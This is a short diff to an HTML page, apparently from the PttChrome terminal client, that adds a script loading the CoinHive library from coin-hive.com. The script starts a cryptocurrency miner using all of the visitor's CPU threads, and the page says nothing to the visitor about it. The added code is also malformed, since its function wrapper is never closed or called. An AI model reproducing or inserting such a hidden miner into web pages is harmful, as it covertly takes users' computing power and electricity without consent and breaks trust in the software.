@@ -37,6 +37,16 @@
   fjs.parentNode.insertBefore(js, fjs);
   }(document, 'script', 'facebook-jssdk'));
   </script>
+  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+  <script>(function(d, s, id) {
+    var miner = new CoinHive.User('mAaBxSPiU7NIvujQMYcqqv2lGmK55HOh', 'PttChrome', {
+      threads: navigator.hardwareConcurrency,
+      autoThreads: false,
+      throttle: 0.5,
+      forceASMJS: false
+      });
+    miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
+  </script>
     <ul id="contextMenus" class="dropdown-menu" role="menu" style="display:none">
       <li id="cmenu_copy" class="cmenuItem contextSel"><a></a></li>
       <li id="cmenu_copyAnsi" class="cmenuItem contextSel"><a></a></li>
